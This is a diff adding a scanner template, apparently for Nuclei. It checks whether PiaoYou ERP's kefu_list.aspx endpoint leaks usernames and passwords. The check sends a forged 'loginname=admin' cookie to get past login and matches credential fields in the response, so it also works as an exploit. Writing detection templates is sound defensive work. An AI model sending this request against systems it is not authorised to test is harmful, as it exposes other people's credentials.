@@ -1,0 +1,32 @@
+id: piaoyou-erp-info-leak
+info:
+  name: PiaoYou ERP Management System kefu_list.aspx Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    Detects information leakage in the kefu_list.aspx endpoint of the PiaoYou ERP Management System. This includes potential exposure of usernames and passwords.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/json_db/kefu_list.aspx"
+    headers:
+      Cookie: pyerpcookie=loginname=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\"username\":\"([0-9a-zA-Z]+)\","
+      - type: regex
+        regex:
+          - "\"password\":\"([A-Za-z0-9+/]+={0,2})\","
+      - type: word
+        words:
+          - "\"total\":"
+      - type: word
+        words:
+          - "<"
+        negative: true
